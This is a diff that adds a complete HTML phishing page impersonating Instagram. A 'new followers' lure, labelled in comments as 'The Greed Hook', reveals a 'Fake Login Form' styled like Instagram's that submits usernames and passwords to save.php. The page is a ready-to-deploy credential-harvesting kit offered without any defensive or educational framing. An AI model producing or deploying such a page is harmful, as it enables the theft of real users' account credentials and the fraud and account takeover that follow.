@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - New Followers</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            text-align: center;
+            border-radius: 1px;
+        }
+        h2 {
+            color: #262626;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+        }
+        .btn:hover {
+            background-color: #0074c4;
+        }
+        /* Hidden Login Form */
+        #login-form {
+            display: none;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 12px;
+        }
+        .logo {
+            font-family: 'Grand Hotel', cursive; /* Fallback for IG font */
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+    </style>
+    <!-- Import Instagram-like font -->
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="container">
+    <!-- Step 1: The Greed Hook -->
+    <div id="hook">
+        <h2>You have new followers!</h2>
+        <p>Someone special just followed you.</p>
+        <button class="btn" onclick="showLogin()">View Profile</button>
+    </div>
+
+    <!-- Step 2: The Fake Login Form -->
+    <form id="login-form" action="save.php" method="POST">
+        <div class="logo">Instagram</div>
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="btn">Log in</button>
+    </form>
+</div>
+
+<script>
+    function showLogin() {
+        document.getElementById('hook').style.display = 'none';
+        document.getElementById('login-form').style.display = 'block';
+    }
+</script>
+
+</body>
+</html>
